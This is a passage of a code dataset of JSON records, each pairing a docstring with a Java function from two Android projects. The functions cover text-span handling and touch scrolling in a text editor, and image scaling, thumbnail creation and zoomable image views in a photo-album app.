Spanned.SPAN_POINT_POINT);\n        }\n        if (selend > start && selend < end) {\n            long off = selend - start;\n\n            off = off * inserted / (end - start);\n            selend = (int) off + start;\n\n            setSpan(false, Selection.SELECTION_END, selend, selend,\n                    Spanned.SPAN_POINT_POINT);\n        }\n\n        sendTextChange(recipients, start, origlen, inserted);\n        sendTextHasChanged(recipients);\n    }\n    return this;\n}", "path": "src\\jp\\sblo\\pandora\\jota\\text\\SpannableStringBuilder.java", "repo_name": "jiro-aqua/Jota-Text-Editor-old", "stars": 64, "license": "None", "language": "java", "size": 1694}
{"docstring": "/**\n * Don't call this yourself -- exists for Paint to use internally.\n * {@hide}\n */\n", "func_signal": "public float measureText(int start, int end, Paint p)", "code": "{\n    checkRange(\"measureText\", start, end);\n\n    float ret;\n\n    if (end <= mGapStart) {\n        ret = p.measureText(mText, start, end - start);\n    } else if (start >= mGapStart) {\n        ret = p.measureText(mText, start + mGapLength, end - start);\n    } else {\n        char[] buf = TextUtils.obtain(end - start);\n\n        getChars(start, end, buf, 0);\n        ret = p.measureText(buf, 0, end - start);\n        TextUtils.recycle(buf);\n    }\n\n    return ret;\n}", "path": "src\\jp\\sblo\\pandora\\jota\\text\\SpannableStringBuilder.java", "repo_name": "jiro-aqua/Jota-Text-Editor-old", "stars": 64, "license": "None", "language": "java", "size": 1694}
{"docstring": "/**\n * Runs any pending requests that are waiting for a connection to the\n * service to be established.  This runs in the main UI thread.\n */\n", "func_signal": "private void runPendingRequests()", "code": "{\n    int maxStartId = -1;\n    BillingRequest request;\n    while ((request = mPendingRequests.peek()) != null) {\n        if (request.runIfConnected()) {\n            // Remove the request\n            mPendingRequests.remove();\n\n            // Remember the largest startId, which is the most recent\n            // request to start this service.\n            if (maxStartId < request.getStartId()) {\n                maxStartId = request.getStartId();\n            }\n        } else {\n            // The service crashed, so restart it. Note that this leaves\n            // the current request on the queue.\n            bindToMarketBillingService();\n            return;\n        }\n    }\n\n    // If we get here then all the requests ran successfully.  If maxStartId\n    // is not -1, then one of the requests started the service, so we can\n    // stop it now.\n    if (maxStartId >= 0) {\n        if (Consts.DEBUG) {\n            Log.i(TAG, \"stopping service, startId: \" + maxStartId);\n        }\n        stopSelf(maxStartId);\n    }\n}", "path": "src\\jp\\sblo\\pandora\\billing\\BillingService.java", "repo_name": "jiro-aqua/Jota-Text-Editor-old", "stars": 64, "license": "None", "language": "java", "size": 1694}
{"docstring": "/**\n * Handles touch events for dragging.  You may want to do other actions\n * like moving the cursor on touch as well.\n */\n", "func_signal": "public static boolean onTouchEvent(TextView widget, Spannable buffer,\n                                   MotionEvent event)", "code": "{\n    DragState[] ds;\n\n    ds = buffer.getSpans(0, buffer.length(), DragState.class);\n\n    if ( ds.length > 0 ){\n        if ( ds[0].mVelocityTracker == null) {\n            ds[0].mVelocityTracker = VelocityTracker.obtain();\n        }\n        ds[0].mVelocityTracker.addMovement(event);\n    }\n\n    switch (event.getAction()) {\n    case MotionEvent.ACTION_DOWN:\n        if ( ds.length>0 ){\n            if ( ds[0].mFlingRunnable != null ){\n                ds[0].mFlingRunnable.endFling();\n                widget.cancelLongPress();\n            }\n        }\n        for (int i = 0; i < ds.length; i++) {\n            buffer.removeSpan(ds[i]);\n        }\n\n        buffer.setSpan(new DragState(event.getX(), event.getY(),\n                        widget.getScrollX(), widget.getScrollY()),\n                0, 0, Spannable.SPAN_MARK_MARK);\n\n        return true;\n\n    case MotionEvent.ACTION_UP:\n    {\n        boolean result = false;\n//            for (int i = 0; i < ds.length; i++) {\n//                buffer.removeSpan(ds[i]);\n//            }\n        boolean cap = (MetaKeyKeyListener.getMetaState(buffer,\n                KeyEvent.META_SHIFT_ON) == 1) ||\n                (MetaKeyKeyListener.getMetaState(buffer,\n                 MetaKeyKeyListener.META_SELECTING) != 0);\n\n        if (ds.length > 0 && ds[0].mUsed) {\n            result = true;\n            if ( !cap ){\n                final VelocityTracker velocityTracker = ds[0].mVelocityTracker;\n                int mMinimumVelocity = ViewConfiguration.get(widget.getContext()).getScaledMinimumFlingVelocity();\n                int mMaximumVelocity = ViewConfiguration.get(widget.getContext()).getScaledMaximumFlingVelocity();\n                velocityTracker.computeCurrentVelocity(1000, mMaximumVelocity);\n                final int initialVelocity = (int) velocityTracker.getYVelocity();\n\n                if (Math.abs(initialVelocity) > mMinimumVelocity) {\n                    if (ds[0].mFlingRunnable == null) {\n                        ds[0].mFlingRunnable = new FlingRunnable( widget.getContext() );\n                    }\n//                    reportScrollStateChange(OnScrollListener.SCROLL_STATE_FLING);\n\n                    ds[0].mFlingRunnable.start(widget , -initialVelocity);\n                } else {\n//                    mTouchMode = TOUCH_MODE_REST;\n//                    reportScrollStateChange(OnScrollListener.SCROLL_STATE_IDLE);\n                    widget.moveCursorToVisibleOffset();\n                }\n            }else{\n                widget.moveCursorToVisibleOffset();\n            }\n        } else {\n            widget.moveCursorToVisibleOffset();\n        }\n\n        if (ds[0].mVelocityTracker != null) {\n            ds[0].mVelocityTracker.recycle();\n            ds[0].mVelocityTracker = null;\n        }\n\n        return result;\n    }\n    case MotionEvent.ACTION_MOVE:\n\n        if (ds.length > 0) {\n            if (ds[0].mFarEnough == false) {\n                int slop = ViewConfiguration.get(widget.getContext()).getScaledTouchSlop();\n\n                if (Math.abs(event.getX() - ds[0].mX) >= slop ||\n                    Math.abs(event.getY() - ds[0].mY) >= slop) {\n                    ds[0].mFarEnough = true;\n                }\n            }\n\n            if (ds[0].mFarEnough) {\n                ds[0].mUsed = true;\n                boolean cap = (MetaKeyKeyListener.getMetaState(buffer,\n                               KeyEvent.META_SHIFT_ON) == 1) ||\n                               (MetaKeyKeyListener.getMetaState(buffer,\n                                MetaKeyKeyListener.META_SELECTING) != 0);\n                float dx;\n                float dy;\n                if (cap) {\n                    // if we're selecting, we want the scroll to go in\n                    // the direction of the drag\n                    dx = event.getX() - ds[0].mX;\n                    dy = event.getY() - ds[0].mY;\n                } else {\n                    dx = ds[0].mX - event.getX();\n                    dy = ds[0].mY - event.getY();\n                }\n                ds[0].mX = event.getX();\n                ds[0].mY = event.getY();\n\n                int nx = widget.getScrollX() + (int) dx;\n                int ny = widget.getScrollY() + (int) dy;\n\n                int padding = widget.getTotalPaddingTop() +\n                              widget.getTotalPaddingBottom();\n                Layout layout = widget.getLayout();\n\n                ny = Math.min(ny, layout.getHeight() - (widget.getHeight() -\n                                                        padding));\n                ny = Math.max(ny, 0);\n\n                int oldX = widget.getScrollX();\n                int oldY = widget.getScrollY();\n\n                scrollTo(widget, layout, nx, ny);\n\n                // If we actually scrolled, then cancel the up action.\n                if (oldX != widget.getScrollX()\n                        || oldY != widget.getScrollY()) {\n                    widget.cancelLongPress();\n                }\n\n                return true;\n            }\n        }\n    }\n\n    return false;\n}", "path": "src\\jp\\sblo\\pandora\\jota\\text\\Touch.java", "repo_name": "jiro-aqua/Jota-Text-Editor-old", "stars": 64, "license": "None", "language": "java", "size": 1694}
{"docstring": "/**\n * Return the flags of the end of the specified\n * markup object, or 0 if it is not attached to this buffer.\n */\n", "func_signal": "public int getSpanFlags(Object what)", "code": "{\n    int count = mSpanCount;\n    Object[] spans = mSpans;\n\n    for (int i = count - 1; i >= 0; i--) {\n        if (spans[i] == what) {\n            return mSpanFlags[i];\n        }\n    }\n\n    return 0;\n}", "path": "src\\jp\\sblo\\pandora\\jota\\text\\SpannableStringBuilder.java", "repo_name": "jiro-aqua/Jota-Text-Editor-old", "stars": 64, "license": "None", "language": "java", "size": 1694}
{"docstring": "/**\n * Constructor taking separate indents for the first and subsequent\n * lines.\n *\n * @param first the indent for the first line of the paragraph\n * @param rest the indent for the remaining lines of the paragraph\n */\n", "func_signal": "public Standard(int first, int rest)", "code": "{\n    mFirst = first;\n    mRest = rest;\n}", "path": "src\\jp\\sblo\\pandora\\jota\\text\\style\\LeadingMarginSpan.java", "repo_name": "jiro-aqua/Jota-Text-Editor-old", "stars": 64, "license": "None", "language": "java", "size": 1694}
{"docstring": "/**\n * Copy the specified range of chars from this buffer into the\n * specified array, beginning at the specified offset.\n */\n", "func_signal": "public void getChars(int start, int end, char[] dest, int destoff)", "code": "{\n    checkRange(\"getChars\", start, end);\n\n    if (end <= mGapStart) {\n        System.arraycopy(mText, start, dest, destoff, end - start);\n    } else if (start >= mGapStart) {\n        System.arraycopy(mText, start + mGapLength,\n                         dest, destoff, end - start);\n    } else {\n        System.arraycopy(mText, start, dest, destoff, mGapStart - start);\n        System.arraycopy(mText, mGapStart + mGapLength,\n                         dest, destoff + (mGapStart - start),\n                         end - mGapStart);\n    }\n}", "path": "src\\jp\\sblo\\pandora\\jota\\text\\SpannableStringBuilder.java", "repo_name": "jiro-aqua/Jota-Text-Editor-old", "stars": 64, "license": "None", "language": "java", "size": 1694}
{"docstring": "/**\n * Remove the specified markup object from the buffer.\n */\n", "func_signal": "public void removeSpan(Object what)", "code": "{\n    for (int i = mSpanCount - 1; i >= 0; i--) {\n        if (mSpans[i] == what) {\n            int ostart = mSpanStarts[i];\n            int oend = mSpanEnds[i];\n\n            if (ostart > mGapStart)\n                ostart -= mGapLength;\n            if (oend > mGapStart)\n                oend -= mGapLength;\n\n            int count = mSpanCount - (i + 1);\n\n            System.arraycopy(mSpans, i + 1, mSpans, i, count);\n            System.arraycopy(mSpanStarts, i + 1, mSpanStarts, i, count);\n            System.arraycopy(mSpanEnds, i + 1, mSpanEnds, i, count);\n            System.arraycopy(mSpanFlags, i + 1, mSpanFlags, i, count);\n\n            mSpanCount--;\n            mSpans[mSpanCount] = null;\n\n            sendSpanRemoved(what, ostart, oend);\n            return;\n        }\n    }\n}", "path": "src\\jp\\sblo\\pandora\\jota\\text\\SpannableStringBuilder.java", "repo_name": "jiro-aqua/Jota-Text-Editor-old", "stars": 64, "license": "None", "language": "java", "size": 1694}
{"docstring": "// Documentation from interface\n", "func_signal": "public SpannableStringBuilder append(CharSequence text)", "code": "{\n    int length = length();\n    return replace(length, length, text, 0, text.length());\n}", "path": "src\\jp\\sblo\\pandora\\jota\\text\\SpannableStringBuilder.java", "repo_name": "jiro-aqua/Jota-Text-Editor-old", "stars": 64, "license": "None", "language": "java", "size": 1694}
{"docstring": "/**\n * Called when a remote exception occurs while trying to execute the\n * {@link #run()} method.  The derived class can override this to\n * execute exception-handling code.\n * @param e the exception\n */\n", "func_signal": "protected void onRemoteException(RemoteException e)", "code": "{\n    Log.w(TAG, \"remote billing service crashed\");\n    mService = null;\n}", "path": "src\\jp\\sblo\\pandora\\billing\\BillingService.java", "repo_name": "jiro-aqua/Jota-Text-Editor-old", "stars": 64, "license": "None", "language": "java", "size": 1694}
{"docstring": "/**\n * Return the next offset after <code>start</code> but less than or\n * equal to <code>limit</code> where a span of the specified type\n * begins or ends.\n */\n", "func_signal": "public int nextSpanTransition(int start, int limit, Class kind)", "code": "{\n    int count = mSpanCount;\n    Object[] spans = mSpans;\n    int[] starts = mSpanStarts;\n    int[] ends = mSpanEnds;\n    int gapstart = mGapStart;\n    int gaplen = mGapLength;\n\n    if (kind == null) {\n        kind = Object.class;\n    }\n\n    for (int i = 0; i < count; i++) {\n        int st = starts[i];\n        int en = ends[i];\n\n        if (st > gapstart)\n            st -= gaplen;\n        if (en > gapstart)\n            en -= gaplen;\n\n        if (st > start && st < limit && kind.isInstance(spans[i]))\n            limit = st;\n        if (en > start && en < limit && kind.isInstance(spans[i]))\n            limit = en;\n    }\n\n    return limit;\n}", "path": "src\\jp\\sblo\\pandora\\jota\\text\\SpannableStringBuilder.java", "repo_name": "jiro-aqua/Jota-Text-Editor-old", "stars": 64, "license": "None", "language": "java", "size": 1694}
{"docstring": "/**\n * Scrolls the specified widget to the specified coordinates, except\n * constrains the X scrolling position to the horizontal regions of\n * the text that will be visible after scrolling to the specified\n * Y position.\n */\n", "func_signal": "public static void scrollTo(TextView widget, Layout layout, int x, int y)", "code": "{\n    int padding = widget.getTotalPaddingTop() +\n                  widget.getTotalPaddingBottom();\n    int top = layout.getLineForVertical(y);\n    int bottom = layout.getLineForVertical(y + widget.getHeight() -\n                                           padding);\n\n    int left = Integer.MAX_VALUE;\n    int right = 0;\n    Alignment a = null;\n\n    for (int i = top; i <= bottom; i++) {\n        left = (int) Math.min(left, layout.getLineLeft(i));\n        right = (int) Math.max(right, layout.getLineRight(i)+sLineNumberWidth);    // Jota Text Editor\n\n        if (a == null) {\n            a = layout.getParagraphAlignment(i);\n        }\n    }\n\n    padding = widget.getTotalPaddingLeft() + widget.getTotalPaddingRight();\n    int width = widget.getWidth();\n    int diff = 0;\n\n    if (right - left < width - padding) {\n        if (a == Alignment.ALIGN_CENTER) {\n            diff = (width - padding - (right - left)) / 2;\n        } else if (a == Alignment.ALIGN_OPPOSITE) {\n            diff = width - padding - (right - left);\n        }\n    }\n\n    x = Math.min(x, right - (width - padding) - diff);\n    x = Math.max(x, left - diff);\n\n    widget.scrollTo(x, y);\n}", "path": "src\\jp\\sblo\\pandora\\jota\\text\\Touch.java", "repo_name": "jiro-aqua/Jota-Text-Editor-old", "stars": 64, "license": "None", "language": "java", "size": 1694}
{"docstring": "/**\n * \u901a\u8fc7uri\u83b7\u53d6\u6587\u4ef6\u7684\u7edd\u5bf9\u8def\u5f84\n * \n * @param uri\n * @return\n */\n", "func_signal": "@SuppressWarnings(\"deprecation\")\npublic static String getAbsoluteImagePath(Activity context, Uri uri)", "code": "{\n\tString imagePath = \"\";\n\tString[] proj = { MediaStore.Images.Media.DATA };\n\tCursor cursor = context.managedQuery(uri, proj, // Which columns to\n\t\t\t// return\n\t\t\tnull, // WHERE clause; which rows to return (all rows)\n\t\t\tnull, // WHERE clause selection arguments (none)\n\t\t\tnull); // Order-by clause (ascending by name)\n\n\tif (cursor != null) {\n\t\tint column_index = cursor\n\t\t\t\t.getColumnIndexOrThrow(MediaStore.Images.Media.DATA);\n\t\tif (cursor.getCount() > 0 && cursor.moveToFirst()) {\n\t\t\timagePath = cursor.getString(column_index);\n\t\t}\n\t}\n\n\treturn imagePath;\n}", "path": "app\\src\\main\\java\\com\\example\\localalbum\\common\\ImageUtils.java", "repo_name": "LinJZong/LocalAlbum", "stars": 66, "license": "None", "language": "java", "size": 564}
{"docstring": "/**\n * \u653e\u5927\u7f29\u5c0f\u56fe\u7247\n * \n * @param bitmap\n * @param w\n * @param h\n * @return\n */\n", "func_signal": "public static Bitmap zoomBitmap(Bitmap bitmap, int w, int h,int rotate)", "code": "{\n\tBitmap newbmp = null;\n\tif (bitmap != null) {\n\t\tint width = bitmap.getWidth();\n\t\tint height = bitmap.getHeight();\n\t\tMatrix matrix = new Matrix();\n\t\tfloat scaleWidht = ((float) w / width);\n\t\tfloat scaleHeight = ((float) h / height);\n\t\tmatrix.postScale(scaleWidht, scaleHeight);\n\t\tmatrix.postRotate(rotate);\n\t\tnewbmp = Bitmap.createBitmap(bitmap, 0, 0, width, height, matrix,\n\t\t\t\ttrue);\n\t}\n\treturn newbmp;\n}", "path": "app\\src\\main\\java\\com\\example\\localalbum\\common\\ImageUtils.java", "repo_name": "LinJZong/LocalAlbum", "stars": 66, "license": "None", "language": "java", "size": 564}
{"docstring": "//\u5173\u95ed\u5927\u56fe\u663e\u793a\n", "func_signal": "private void hideViewPager()", "code": "{\n    pagerContainer.setVisibility(View.GONE);\n    editContainer.setVisibility(View.VISIBLE);\n    AnimationSet set = new AnimationSet(true);\n    ScaleAnimation scaleAnimation = new ScaleAnimation(1, (float) 0.9, 1, (float) 0.9, pagerContainer.getWidth() / 2, pagerContainer.getHeight() / 2);\n    scaleAnimation.setDuration(200);\n    set.addAnimation(scaleAnimation);\n    AlphaAnimation alphaAnimation = new AlphaAnimation(1, 0);\n    alphaAnimation.setDuration(200);\n    set.addAnimation(alphaAnimation);\n    pagerContainer.startAnimation(set);\n}", "path": "app\\src\\main\\java\\com\\example\\localalbum\\ui\\DynamicPost.java", "repo_name": "LinJZong/LocalAlbum", "stars": 66, "license": "None", "language": "java", "size": 564}
{"docstring": "/**\n *   \u521d\u59cb\u5316\u6a21\u677fMatrix\u548c\u56fe\u7247\u7684\u5176\u4ed6\u6570\u636e\n */\n", "func_signal": "private void initData()", "code": "{\n\t//\u8bbe\u7f6e\u5b8c\u56fe\u7247\u540e\uff0c\u83b7\u53d6\u8be5\u56fe\u7247\u7684\u5750\u6807\u53d8\u6362\u77e9\u9635\n\tmMatrix.set(getImageMatrix());\n\tfloat[] values=new float[9];\n\tmMatrix.getValues(values);\n\t//\u56fe\u7247\u5bbd\u5ea6\u4e3a\u5c4f\u5e55\u5bbd\u5ea6\u9664\u7f29\u653e\u500d\u6570\n\tmImageWidth=getWidth()/values[Matrix.MSCALE_X];\n\tmImageHeight=(getHeight()-values[Matrix.MTRANS_Y]*2)/values[Matrix.MSCALE_Y];\n\tmScale=values[Matrix.MSCALE_X];\n}", "path": "app\\src\\main\\java\\com\\example\\localalbum\\widget\\MatrixImageView.java", "repo_name": "LinJZong/LocalAlbum", "stars": 66, "license": "None", "language": "java", "size": 564}
{"docstring": "/**\n * \u521b\u5efa\u7f29\u7565\u56fe\n * \n * @param context\n * @param largeImagePath\n *            \u539f\u59cb\u5927\u56fe\u8def\u5f84\n * @param thumbfilePath\n *            \u8f93\u51fa\u7f29\u7565\u56fe\u8def\u5f84\n * @param square_size\n *            \u8f93\u51fa\u56fe\u7247\u5bbd\u5ea6\n * @param quality\n *            \u8f93\u51fa\u56fe\u7247\u8d28\u91cf\n * @throws IOException\n */\n", "func_signal": "public static void createImageThumbnail(Context context,\n\t\tString largeImagePath, String thumbfilePath, int square_size,\n\t\tint quality,int rotate) throws IOException", "code": "{\n\tBitmapFactory.Options options = new BitmapFactory.Options();\n\toptions.inJustDecodeBounds = true;\n\tBitmapFactory.decodeFile(largeImagePath, options);\n\toptions.inSampleSize = caculateInSampleSize(options,\n\t\t\tsquare_size, square_size);\n\n\t// \u4f7f\u7528\u83b7\u5f97\u5230\u7684InSampleSize\u518d\u6b21\u89e3\u6790\u56fe\u7247\n\toptions.inJustDecodeBounds = false;\n\t// \u539f\u59cb\u56fe\u7247bitmap\n\tBitmap cur_bitmap = getBitmapByPath(largeImagePath, options);\n\n\tif (cur_bitmap == null)\n\t\treturn;\n\n\t// \u539f\u59cb\u56fe\u7247\u7684\u9ad8\u5bbd\n//\t\tint[] cur_img_size = new int[] { cur_bitmap.getWidth(),\n//\t\t\t\tcur_bitmap.getHeight() };\n\t// \u8ba1\u7b97\u539f\u59cb\u56fe\u7247\u7f29\u653e\u540e\u7684\u5bbd\u9ad8\n//\t\tint[] new_img_size = scaleImageSize(cur_img_size, square_size);\n\t// \u751f\u6210\u7f29\u653e\u540e\u7684bitmap\n//\t\tBitmap thb_bitmap = zoomBitmap(cur_bitmap, new_img_size[0],\n//\t\t\t\tnew_img_size[1],rotate);\n\t// \u751f\u6210\u7f29\u653e\u540e\u7684\u56fe\u7247\u6587\u4ef6\n\tsaveImageToSD(null, thumbfilePath, cur_bitmap, quality);\n}", "path": "app\\src\\main\\java\\com\\example\\localalbum\\common\\ImageUtils.java", "repo_name": "LinJZong/LocalAlbum", "stars": 66, "license": "None", "language": "java", "size": 564}
{"docstring": "/**\n * \u83b7\u53d6\u56fe\u7247\u7c7b\u578b\n *\n * @param file\n * @return\n */\n", "func_signal": "public static String getImageType(File file)", "code": "{\n\tif (file == null || !file.exists()) {\n\t\treturn null;\n\t}\n\tInputStream in = null;\n\ttry {\n\t\tin = new FileInputStream(file);\n\t\tString type = getImageType(in);\n\t\treturn type;\n\t} catch (IOException e) {\n\t\treturn null;\n\t} finally {\n\t\ttry {\n\t\t\tif (in != null) {\n\t\t\t\tin.close();\n\t\t\t}\n\t\t} catch (IOException e) {\n\t\t}\n\t}\n}", "path": "app\\src\\main\\java\\com\\example\\localalbum\\common\\ImageUtils.java", "repo_name": "LinJZong/LocalAlbum", "stars": 66, "license": "None", "language": "java", "size": 564}
{"docstring": "/**\n * \u83b7\u53d6\u7167\u76f8\u673a\u4f7f\u7528\u7684\u76ee\u5f55\n * \n * @return\n */\n", "func_signal": "public static String getCamerPath()", "code": "{\n\treturn Environment.getExternalStorageDirectory() + File.separator\n\t\t\t+ \"FounderNews\" + File.separator;\n}", "path": "app\\src\\main\\java\\com\\example\\localalbum\\common\\ImageUtils.java", "repo_name": "LinJZong/LocalAlbum", "stars": 66, "license": "None", "language": "java", "size": 564}
{"docstring": "/**\n * @Description\uff1a \u521d\u59cb\u5316Views\n */\n", "func_signal": "private void initViews()", "code": "{\n    // TODO Auto-generated method stub\n    mBack = (ImageView) findViewById(R.id.post_back);\n    mSend = findViewById(R.id.post_send);\n    mContent = (EditText) findViewById(R.id.post_content);\n    textRemain = (TextView) findViewById(R.id.post_text_remain);\n    picRemain = (TextView) findViewById(R.id.post_pic_remain);\n    add = (ImageView) findViewById(R.id.post_add_pic);\n    picContainer = (LinearLayout) findViewById(R.id.post_pic_container);\n    scrollView = (HorizontalScrollView) findViewById(R.id.post_scrollview);\n    viewpager = (AlbumViewPager) findViewById(R.id.albumviewpager);\n    mBackView = (ImageView) findViewById(R.id.header_bar_photo_back);\n    mCountView = (TextView) findViewById(R.id.header_bar_photo_count);\n    mHeaderBar = findViewById(R.id.album_item_header_bar);\n    delete = (ImageView) findViewById(R.id.header_bar_photo_delete);\n    editContainer = findViewById(R.id.post_edit_container);\n    pagerContainer = findViewById(R.id.pagerview);\n    delete.setVisibility(View.VISIBLE);\n\n    viewpager.setOnPageChangeListener(pageChangeListener);\n    viewpager.setOnSingleTapListener(this);\n    mBackView.setOnClickListener(this);\n    mCountView.setOnClickListener(this);\n    mBack.setOnClickListener(this);\n    mSend.setOnClickListener(this);\n    add.setOnClickListener(this);\n    delete.setOnClickListener(this);\n\n    mContent.addTextChangedListener(new TextWatcher() {\n\n        @Override\n        public void onTextChanged(CharSequence arg0, int arg1, int arg2, int arg3) {\n            // TODO Auto-generated method stub\n\n        }\n\n        @Override\n        public void beforeTextChanged(CharSequence arg0, int arg1, int arg2,\n                                      int arg3) {\n            // TODO Auto-generated method stub\n\n        }\n\n        @Override\n        public void afterTextChanged(Editable content) {\n            textRemain.setText(content.toString().length() + \"/140\");\n        }\n    });\n}", "path": "app\\src\\main\\java\\com\\example\\localalbum\\ui\\DynamicPost.java", "repo_name": "LinJZong/LocalAlbum", "stars": 66, "license": "None", "language": "java", "size": 564}
{"docstring": "/**  \u64ad\u653e\u6309\u94ae\u70b9\u51fb\u4e8b\u4ef6 */\n", "func_signal": "public AlbumViewPager(Context context, AttributeSet attrs)", "code": "{\n\tsuper(context, attrs);\n\tlocalOptions=new DisplayImageOptions.Builder()\n\t\t\t.cacheInMemory(true)\n\t\t\t.cacheOnDisk(false)\n\t\t\t.bitmapConfig(Bitmap.Config.RGB_565)\n\t\t\t.imageScaleType(ImageScaleType.EXACTLY)\n\t\t\t.displayer(new SimpleBitmapDisplayer()).build();\n\t//DisplayImageOptions.getDefaltOpitions(0, R.drawable.dangkr_no_picture,\n\t//((AppContext)context.getApplicationContext()).getWindowWidth());\t\n}", "path": "app\\src\\main\\java\\com\\example\\localalbum\\widget\\AlbumViewPager.java", "repo_name": "LinJZong/LocalAlbum", "stars": 66, "license": "None", "language": "java", "size": 564}
{"docstring": "/**\n * \u83b7\u53d6\u56fe\u7247\u7684\u7c7b\u578b\u4fe1\u606f\n *\n * @param in\n * @return\n * @see #getImageType(byte[])\n */\n", "func_signal": "public static String getImageType(InputStream in)", "code": "{\n\tif (in == null) {\n\t\treturn null;\n\t}\n\ttry {\n\t\tbyte[] bytes = new byte[8];\n\t\tin.read(bytes);\n\t\treturn getImageType(bytes);\n\t} catch (IOException e) {\n\t\treturn null;\n\t}\n}", "path": "app\\src\\main\\java\\com\\example\\localalbum\\common\\ImageUtils.java", "repo_name": "LinJZong/LocalAlbum", "stars": 66, "license": "None", "language": "java", "size": 564}
{"docstring": "/**\n * \u83b7\u5f97\u5e26\u5012\u5f71\u7684\u56fe\u7247\u65b9\u6cd5\n *\n * @param bitmap\n * @return\n */\n", "func_signal": "public static Bitmap createReflectionImageWithOrigin(Bitmap bitmap)", "code": "{\n\tfinal int reflectionGap = 4;\n\tint width = bitmap.getWidth();\n\tint height = bitmap.getHeight();\n\n\tMatrix matrix = new Matrix();\n\tmatrix.preScale(1, -1);\n\n\tBitmap reflectionImage = Bitmap.createBitmap(bitmap, 0, height / 2,\n\t\t\twidth, height / 2, matrix, false);\n\n\tBitmap bitmapWithReflection = Bitmap.createBitmap(width,\n\t\t\t(height + height / 2), Config.ARGB_8888);\n\n\tCanvas canvas = new Canvas(bitmapWithReflection);\n\tcanvas.drawBitmap(bitmap, 0, 0, null);\n\tPaint deafalutPaint = new Paint();\n\tcanvas.drawRect(0, height, width, height + reflectionGap, deafalutPaint);\n\n\tcanvas.drawBitmap(reflectionImage, 0, height + reflectionGap, null);\n\n\tPaint paint = new Paint();\n\tLinearGradient shader = new LinearGradient(0, bitmap.getHeight(), 0,\n\t\t\tbitmapWithReflection.getHeight() + reflectionGap, 0x70ffffff,\n\t\t\t0x00ffffff, TileMode.CLAMP);\n\tpaint.setShader(shader);\n\t// Set the Transfer mode to be porter duff and destination in\n\tpaint.setXfermode(new PorterDuffXfermode(Mode.DST_IN));\n\t// Draw a rectangle using the paint with our linear gradient\n\tcanvas.drawRect(0, height, width, bitmapWithReflection.getHeight()\n\t\t\t+ reflectionGap, paint);\n\n\treturn bitmapWithReflection;\n}", "path": "app\\src\\main\\java\\com\\example\\localalbum\\common\\ImageUtils.java", "repo_name": "LinJZong/LocalAlbum", "stars": 66, "license": "None", "language": "java", "size": 564}
{"docstring": "/**\n *  \u548c\u5f53\u524d\u77e9\u9635\u5bf9\u6bd4\uff0c\u68c0\u9a8cdy\uff0c\u4f7f\u56fe\u50cf\u79fb\u52a8\u540e\u4e0d\u4f1a\u8d85\u51faImageView\u8fb9\u754c\n *  @param values\n *  @param dy\n *  @return\n */\n", "func_signal": "private float checkDyBound(float[] values, float dy)", "code": "{\n\tfloat height=getHeight();\n\tif(mImageHeight*values[Matrix.MSCALE_Y]<height)\n\t\treturn 0;\n\tif(values[Matrix.MTRANS_Y]+dy>0)\n\t\tdy=-values[Matrix.MTRANS_Y];\n\telse if(values[Matrix.MTRANS_Y]+dy<-(mImageHeight*values[Matrix.MSCALE_Y]-height))\n\t\tdy=-(mImageHeight*values[Matrix.MSCALE_Y]-height)-values[Matrix.MTRANS_Y];\n\treturn dy;\n}", "path": "app\\src\\main\\java\\com\\example\\localalbum\\widget\\MatrixImageView.java", "repo_name": "LinJZong/LocalAlbum", "stars": 66, "license": "None", "language": "java", "size": 564}
{"docstring": "/**\n * \u5c06bitmap\u8f6c\u5316\u4e3adrawable\n *\n * @param bitmap\n * @return\n */\n", "func_signal": "public static Drawable bitmapToDrawable(Bitmap bitmap)", "code": "{\n\tDrawable drawable = new BitmapDrawable(bitmap);\n\treturn drawable;\n}", "path": "app\\src\\main\\java\\com\\example\\localalbum\\common\\ImageUtils.java", "repo_name": "LinJZong/LocalAlbum", "stars": 66, "license": "None", "language": "java", "size": 564}
{"docstring": "/**\n *  \u8bbe\u7f6e\u62d6\u62fd\u72b6\u6001\u4e0b\u7684Matrix\n *  @param event\n */\n", "func_signal": "public void setDragMatrix(MotionEvent event)", "code": "{\n\tif(isZoomChanged()){\n\t\tfloat dx = event.getX() - mStartPoint.x; // \u5f97\u5230x\u8f74\u7684\u79fb\u52a8\u8ddd\u79bb\n\t\tfloat dy = event.getY() - mStartPoint.y; // \u5f97\u5230x\u8f74\u7684\u79fb\u52a8\u8ddd\u79bb\n\t\t//\u907f\u514d\u548c\u53cc\u51fb\u51b2\u7a81,\u5927\u4e8e10f\u624d\u7b97\u662f\u62d6\u52a8\n\t\tif(Math.sqrt(dx*dx+dy*dy)>10f){\n\t\t\tmStartPoint.set(event.getX(), event.getY());\n\t\t\t//\u5728\u5f53\u524d\u57fa\u7840\u4e0a\u79fb\u52a8\n\t\t\tmCurrentMatrix.set(getImageMatrix());\n\t\t\tfloat[] values=new float[9];\n\t\t\tmCurrentMatrix.getValues(values);\n\t\t\tdy=checkDyBound(values,dy);\n\t\t\tdx=checkDxBound(values,dx,dy);\n\n\t\t\tmCurrentMatrix.postTranslate(dx, dy);\n\t\t\tsetImageMatrix(mCurrentMatrix);\n\t\t}\n\t}else {\n\t\tstopDrag();\n\t}\n}", "path": "app\\src\\main\\java\\com\\example\\localalbum\\widget\\MatrixImageView.java", "repo_name": "LinJZong/LocalAlbum", "stars": 66, "license": "None", "language": "java", "size": 564}
{"docstring": "/**\n *  \u8ba1\u7b97\u4e24\u4e2a\u624b\u6307\u95f4\u7684\u8ddd\u79bb\n *  @param event\n *  @return\n */\n", "func_signal": "private float distance(MotionEvent event)", "code": "{\n\tfloat dx = event.getX(1) - event.getX(0);\n\tfloat dy = event.getY(1) - event.getY(0);\n\t/** \u4f7f\u7528\u52fe\u80a1\u5b9a\u7406\u8fd4\u56de\u4e24\u70b9\u4e4b\u95f4\u7684\u8ddd\u79bb */\n\treturn (float) Math.sqrt(dx * dx + dy * dy);\n}", "path": "app\\src\\main\\java\\com\\example\\localalbum\\widget\\MatrixImageView.java", "repo_name": "LinJZong/LocalAlbum", "stars": 66, "license": "None", "language": "java", "size": 564}
